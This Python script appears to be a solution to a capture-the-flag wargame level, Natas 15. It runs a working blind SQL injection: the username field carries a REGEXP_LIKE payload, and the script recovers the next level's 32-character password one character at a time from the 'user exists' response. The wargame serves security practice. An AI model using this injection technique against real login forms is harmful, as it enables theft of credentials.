import string
import Auther

password = ""


def predicate(prefix: str, nextChar: str):
    data = {
        'username': f'natas16" AND REGEXP_LIKE(password, "^{prefix}{nextChar}[[:alnum:]]*", "c") AND "" LIKE "'}
    return "This user exists" in Auther.request(15, data=data).text


while predicate(password, '[[:alnum:]]'):  # 32-character password
    print(f"Progress: {password.ljust(32, '*')} -> ", end="")
    chosen_chaset = string.ascii_letters
    if predicate(password, '[[:alpha:]]'):
        chosen_chaset = string.ascii_uppercase if predicate(
            password, '[[:upper:]]') else string.ascii_lowercase
    else:
        chosen_chaset = string.digits
    best = None
    for char in chosen_chaset:
        if predicate(password, char):
            best = char
            break
    if best is None:
        print("Error")
        continue
    password += char
    print(password)

print(f"Final password: {password}")
